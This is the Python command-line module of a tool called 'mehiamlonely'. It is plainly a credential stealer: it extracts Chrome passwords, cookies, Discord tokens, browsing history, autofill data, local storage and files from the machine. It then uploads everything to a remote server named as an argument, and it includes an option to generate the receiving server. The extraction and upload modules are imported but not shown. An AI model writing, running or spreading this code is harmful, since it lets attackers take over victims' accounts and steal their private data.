"""
Command Line Interface for mehiamlonely
Provides easy terminal commands for data extraction and upload
"""

import argparse
import asyncio
import sys
import json
from pathlib import Path
from .extractor import extract_all_data
from .uploader import upload_all_data, create_sample_fastapi_server


async def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description="mehiamlonely - Extract Chrome data and system files, upload to FastAPI server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  mehiamlonely https://your-server.onrender.com/
  mehiamlonely http://localhost:8000
  mehiamlonely --api-key your-api-key https://your-server.com
  mehiamlonely --upload-files --output data.json https://your-server.com
  mehiamlonely --create-server  # Creates sample FastAPI server code
        """
    )
    
    parser.add_argument(
        "server_url",
        nargs="?",
        help="FastAPI server URL (e.g., https://your-server.onrender.com/)"
    )
    parser.add_argument(
        "--api-key", 
        help="API key for server authentication (optional)"
    )
    parser.add_argument(
        "--upload-files", 
        action="store_true",
        help="Upload actual files to server (default: metadata only)"
    )
    parser.add_argument(
        "--output", 
        help="Save extracted data to JSON file"
    )
    parser.add_argument(
        "--test-connection", 
        action="store_true",
        help="Test connection to server without extracting data"
    )
    parser.add_argument(
        "--create-server", 
        action="store_true",
        help="Create sample FastAPI server code"
    )
    parser.add_argument(
        "--verbose", 
        action="store_true",
        help="Enable verbose output"
    )
    
    args = parser.parse_args()
    
    if args.create_server:
        await create_sample_server()
        return
    
    if not args.server_url:
        print("Error: Server URL is required")
        print("Usage: mehiamlonely <server_url>")
        print("Example: mehiamlonely https://your-server.onrender.com/")
        print("Use --help for more options")
        sys.exit(1)
    
    if args.test_connection:
        await test_server_connection(args.server_url, args.api_key)
        return
    
    # Extract and upload data
    await extract_and_upload(args)


async def extract_and_upload(args):
    """Extract data and upload to server"""
    print("🔍 Starting data extraction...")
    
    try:
        # Extract all data
        data = extract_all_data()
        
        if args.verbose:
            print(f"📊 Extracted data summary:")
            print(f"   - Chrome profiles: {len(data['chrome_data']['profiles'])}")
            print(f"   - Passwords: {len(data['chrome_data']['passwords'])}")
            print(f"   - Cookies: {len(data['chrome_data']['cookies'])}")
            print(f"   - Discord tokens: {len(data['chrome_data']['discord_tokens'])}")
            print(f"   - Browser history: {len(data['chrome_data']['history'])}")
            print(f"   - Local storage entries: {len(data['chrome_data']['local_storage'])}")
            print(f"   - Autofill data: {len(data['chrome_data']['autofill_data'])}")
            print(f"   - Extensions: {len(data['chrome_data']['extensions'])}")
            print(f"   - Files: {len(data['files'])}")
            print(f"   - System info: {'Yes' if data['system_info'] else 'No'}")
        
        # Save to file if requested
        if args.output:
            output_path = Path(args.output)
            with open(output_path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            print(f"💾 Data saved to {output_path}")
        
        # Upload to server
        print(f"📤 Uploading to server: {args.server_url}")
        upload_result = await upload_all_data(
            args.server_url, 
            data, 
            args.api_key, 
            args.upload_files
        )
        
        # Display results
        if upload_result["success"]:
            print("✅ Upload successful!")
            if args.verbose:
                print(f"   - Connection test: {upload_result['connection_test']['message']}")
                print(f"   - Data upload: {upload_result['data_upload']['message']}")
                if upload_result['file_uploads']:
                    print(f"   - Files uploaded: {len(upload_result['file_uploads'])}")
        else:
            print("❌ Upload failed!")
            print(f"   Error: {upload_result['message']}")
            if args.verbose:
                print(f"   Details: {json.dumps(upload_result, indent=2, default=str)}")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\n⚠️  Operation cancelled by user")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


async def test_server_connection(server_url: str, api_key: str = None):
    """Test connection to server"""
    from .uploader import DataUploader
    
    print(f"🔗 Testing connection to {server_url}...")
    
    uploader = DataUploader(server_url, api_key)
    result = await uploader.test_connection()
    
    if result["success"]:
        print("✅ Connection successful!")
        if "server_info" in result:
            print(f"   Server info: {result['server_info']}")
    else:
        print("❌ Connection failed!")
        print(f"   Error: {result['message']}")
        sys.exit(1)


async def create_sample_server():
    """Create sample FastAPI server code"""
    server_code = create_sample_fastapi_server()
    
    server_file = Path("sample_server.py")
    with open(server_file, 'w') as f:
        f.write(server_code)
    
    print(f"📝 Sample FastAPI server created: {server_file}")
    print("\nTo run the server:")
    print("   python sample_server.py")
    print("\nThen test with:")
    print(f"   mehiamlonely http://localhost:8000")


def cli_main():
    """Synchronous wrapper for CLI entry point"""
    asyncio.run(main())

if __name__ == "__main__":
    cli_main()